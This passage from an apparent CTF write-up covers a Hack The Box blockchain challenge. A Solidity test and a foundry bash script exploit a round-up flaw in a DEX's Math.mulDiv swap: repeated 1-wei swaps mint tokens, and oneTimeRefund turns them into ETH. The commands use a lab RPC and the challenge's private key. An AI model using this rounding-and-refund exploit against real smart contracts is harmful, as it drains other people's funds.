+</span></span><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/utils/math/Math.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Test {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">immutable</span> feeBps <span style="color:#7a8478">=</span> <span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">roundWithFees</span>() <span style="color:#e67e80">payable</span>  <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint256</span>, <span style="color:#dbbc7f">uint256</span>, <span style="color:#dbbc7f">uint256</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> ELD <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, <span style="color:#d699b6">2</span>, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">0</span>));
+</span></span><span style="display:flex;"><span>        ELD <span style="color:#7a8478">=</span> ELD <span style="color:#7a8478">-</span> ((ELD <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> MAL <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, <span style="color:#d699b6">4</span>, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">1</span>));
+</span></span><span style="display:flex;"><span>        MAL <span style="color:#7a8478">=</span> MAL <span style="color:#7a8478">-</span> ((MAL <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> HLS <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, <span style="color:#d699b6">10</span>, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">3</span>));
+</span></span><span style="display:flex;"><span>        HLS <span style="color:#7a8478">=</span> HLS <span style="color:#7a8478">-</span> ((HLS <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> (ELD, MAL, HLS);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>Calling <code>roundWithFees()</code> with a value of 1 ether we get :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;0&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 2&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;1&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 4&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;2&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 10&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2 ELD, 4 MAL and 10 HLS.</p>
+<p>With 0.99 ether :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;0&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 1&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;1&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 4&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;2&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 9&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Calling the test function with the minimal value (1 wei) still give us MAL and HLS token.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;0&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 0&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;1&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 1&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#7a8478">&#34;2&#34;</span>: <span style="color:#b2c98f">&#34;uint256: 1&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remembering the code :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioMAL, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">1</span>));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For a minimal <code>msg.value</code> sent, we still get this result for MAL:</p>
+$$ \frac {1 * 4}{10^{18}} = 4\times10^{-18} = 0.000000000000000004 $$<p>But rounded up, it gives us the next upper integer value which is <code>1</code>.</p>
+<blockquote>
+<p>The value is rounded up if in <code>Math.mulDiv(x)</code>, x &gt; 0.</p>
+</blockquote>
+<p>So to solve the challenge, we can generate many MAL or HLS tokens by sending 1 wei to swap, and after having gathered enough token, refund.</p>
+<p>For 100 MAL tokens we get around $ \frac {100}{4} = 25 $ ethers.</p>
+<p>I wrote a shell scripts to swap 100 tokens automatically :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">get-tokens.sh</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e67e80">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#e67e80"></span>
+</span></span><span style="display:flex;"><span>RPC<span style="color:#7a8478">=</span>http://83.136.254.234:35168
+</span></span><span style="display:flex;"><span>PKEY<span style="color:#7a8478">=</span>0xe32e96dfb77ba63e8b86ad868fbfb28121d72f0e9668b6a1e5e6d7896e70af75
+</span></span><span style="display:flex;"><span>ADDRESS<span style="color:#7a8478">=</span>0x36D32AdDc84ea8E7Fa2A395758DED00723EdA39b
+</span></span><span style="display:flex;"><span>TARGET<span style="color:#7a8478">=</span>0xE599FaEC47C3Fb9c4a0567e2D9f1adF809ceD0f8
+</span></span><span style="display:flex;"><span>SETUP<span style="color:#7a8478">=</span>0xe760faEd9Ee729fc7746eB4f08D387A4635e5e45
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAL<span style="color:#7a8478">=</span><span style="color:#e67e80">$(</span>cast call -r $RPC $TARGET <span style="color:#b2c98f">&#34;malakarEssence()(address)&#34;</span><span style="color:#e67e80">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">for</span> item in <span style="color:#7a8478">{</span>1..100<span style="color:#7a8478">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">do</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#d699b6">echo</span> <span style="color:#b2c98f">&#34;</span><span style="color:#e67e80">$(</span>cast send -r $RPC $TARGET --private-key $PKEY --value 1wei <span style="color:#b2c98f">&#39;swapForMAL()&#39;</span><span style="color:#e67e80">)</span><span style="color:#b2c98f">&#34;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast call -r $RPC $MAL <span style="color:#b2c98f">&#34;balanceOf(address)(uint256)&#34;</span> $ADDRESS
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>After that, I have to call <code>oneTimeRefund</code> for the wanted token (MAL) and for a wanted amount, for that i have to :</p>
+<ul>
+<li>retrieve the address of the MAL token address.</li>
+<li>allow the DEX to transfer 100 tokens with the <code>approve</code> function.</li>
+</ul>
+<h2 id="getting-the-flag">Getting the flag</h2>
+<blockquote>
+<p>To send transactions and make calls I use <a href="https://book.getfoundry.sh/">foundry</a></p>
+</blockquote>
+<ul>
+<li>I run the bash script to get the 100 tokens</li>
+</ul>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./make-transactions.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>We retrieve the MalakarEssence contract address :</li>
+</ul>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call -r $RPC $TARGET <span style="color:#b2c98f">&#34;malakarEssence()(address)&#34;</span>
+</span></span><span style="display:flex;"><span>0x07898d9BfdC387b068b52aC04132392bBB7E8dbB
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>And from there I can check my balance (I have 100 MAL tokens) :</li>
+</ul>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call -r $RPC 0x07898d9BfdC387b068b52aC04132392bBB7E8dbB  <span style="color:#b2c98f">&#34;balanceOf(address)(uint256)&#34;</span> $ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">100</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>For the challenge we start at 12 ETH, and after swapping 100 tokens I didn&rsquo;t even lose 1 ETH :</li>
+</ul>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast balance -r $RPC $ADDRESS --ether
+</span></span><span style="display:flex;"><span>11.995278699999999900
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Now I have to set <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-">the allowance</a> for the DEX so it can get the tokens from my balance in order to refund me.</li>
+</ul>
+<p>Because it is actually at 0 :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call -r $RPC 0x07898d9BfdC387b068b52aC04132392bBB7E8dbB  <span style="color:#b2c98f">&#34;allowance(address,address)(uint)&#34;</span> $ADDRESS $TARGET
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I set it at 100 for the 100 tokens I swapped :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send -r $RPC 0x07898d9BfdC387b068b52aC04132392bBB7E8dbB --private-key $PKEY <span style="color:#b2c98f">&#34;approve(address, uint256)&#34;</span> $TARGET <span style="color:#d699b6">100</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The allowance is now at 100 :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call -r $RPC 0x07898d9BfdC387b068b52aC04132392bBB7E8dbB  <span style="color:#b2c98f">&#34;allowance(address,address)(uint)&#34;</span> $ADDRESS $TARGET
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">100</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And I can now call the refund :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send -r $RPC $TARGET --private-key $PKEY <span style="color:#b2c98f">&#34;oneTimeRefund(address,uint)&#34;</span> 0x07898d9BfdC387b068b52aC04132392bBB7E8dbB  <span style="color:#d699b6">100</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I now have 36 ETH which are enough to solve:</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast balance -r $RPC $ADDRESS --ether
+</span></span><span style="display:flex;"><span>36.932588460999999900
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>FLAG : <code>HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_...}</code></p>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/">Ethereum developer ERC20</a></li>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20">Openzeppelin ERC20 documentation</a></li>
+</ul>
+
+</article>
+
+            </div>
+        </main>
+
+  
+    </body>
+</html>
